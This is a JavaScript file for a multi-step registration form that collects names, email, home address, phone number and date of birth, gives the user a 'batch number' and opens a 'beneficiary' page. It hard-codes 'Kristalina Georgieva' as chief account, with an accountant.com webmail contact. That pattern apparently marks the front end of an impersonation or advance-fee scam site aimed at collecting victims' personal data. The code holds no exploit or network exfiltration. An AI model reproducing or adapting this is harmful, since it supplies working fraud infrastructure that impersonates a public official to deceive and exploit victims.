// validate
const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

const contactMail = "dr.kristalina_georgieva@accountant.com";
const chiefAccount = "Kristalina Georgieva";

const hashTag = window.location.hash.substring(1)

const urlParams = new URLSearchParams(window.location.search);
const pages = urlParams.get('page');

// 
$(document).ready(()=>{
    $("#preloading").fadeOut(()=>{
        // 
        if (pages == "beneficiary") {
           getBenefitPage() 
        }
    })
})

// 
$("#batch_form").on('submit', (e)=>{
    e.preventDefault()

    if ($("#batch_input").val() == "") {
        return
    }

    batchNumber($("#batch_input").val().toUpperCase())
})

// 
let batchArray = {}
$("#reg_form").on('submit', (e)=>{
    e.preventDefault()

    // 
   if ($("#sub_btn").text().toLowerCase() == "next") { 
        // check inputs
        let firstInput = document.querySelectorAll(".firstInput")

        firstInput.forEach(inputs => {
            if (inputs.value.length < 2) {
                inputs.style.borderColor = "red";
            }else{
                inputs.style.borderColor = "silver";
            }
        });

        
        if ($("#firstName").val().length < 2 || $("#middleName").val().length < 2 || $("#lastName").val().length < 2 || $("#selectCategory").val().length < 2) {
            return
        }

        $("#preloading").fadeIn("fast", ()=>{
            $("#sub_btn").text("Submit")
            $("#reg_content1").hide()
            $("#reg_content2").slideDown()
        }).fadeOut("slow")
    }

    // 
    if ($("#sub_btn").text().toLowerCase() == "submit") { 
        // encrypt data

        if (!validEmail.test($("#emailAddress").val())) {
            $("#emailAddress").css({"border-color":"red"})
            return
        }

        let secondInput = document.querySelectorAll(".secondInput")

        secondInput.forEach(inputs => {
            if (inputs.value.length < 3) {
                inputs.style.borderColor = "red";
            }else{
                inputs.style.borderColor = "silver";
            }
        });

        if ($("#homeAddress").val().length < 3 || $("#phoneNumber").val().length < 3 || $("#dateBirth").val().length < 3) {
            return
        }

        // 
        $("#preloading").fadeIn("fast", ()=>{
            // generate batch number
            function getRandomInt(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
            }
            let btCode = $("#firstName").val()[0]+$("#middleName").val()[0]+$("#lastName").val()[0]
            let btRand = getRandomInt(100000, 999999)
            let batchNum = `${btCode}-${btRand}`

            //
            batchArray.batchNumber = batchNum
            batchArray.firstName = $("#firstName").val()
            batchArray.middleName = $("#middleName").val()
            batchArray.lastName = $("#lastName").val()
            batchArray.selectCategory = $("#selectCategory").val()

            batchArray.emailAddress = $("#emailAddress").val()
            batchArray.homeAddress = $("#homeAddress").val()
            batchArray.phoneNumber = $("#phoneNumber").val()
            batchArray.dateBirth = $("#dateBirth").val()
            
            localStorage.setItem('batch_number', JSON.stringify(batchArray))

            batchNumber("success")

        }).fadeOut("slow")
        
    }
})

// 
$("#go_back_img").on('click', ()=>{
    $("#preloading").fadeIn("fast", ()=>{
        $("#sub_btn").text("Next")
        $("#reg_content2").hide()
        $("#reg_content1").slideDown()
    }).fadeOut("slow")
})

// 
let date = new Date()
const footer = `
    <img src="./pics/favicon.svg" alt="994">
    <a href="mailto:${contactMail}">@Contact</a> 
    <span>&copy;${date.getFullYear()}</span>  
`
$("#footer").html(footer)